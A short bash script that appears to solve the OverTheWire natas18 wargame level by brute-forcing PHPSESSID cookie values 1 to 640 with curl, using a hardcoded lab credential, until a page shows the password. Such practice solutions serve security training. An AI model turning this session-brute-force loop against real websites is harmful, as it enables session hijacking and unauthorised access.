for i in `seq 640`
do
	val=$(curl -isu natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/ --cookie "PHPSESSID=$i")
	if [[ $val =~ Password ]]; then
		echo "$val"
		break
	fi
	echo "$i"

done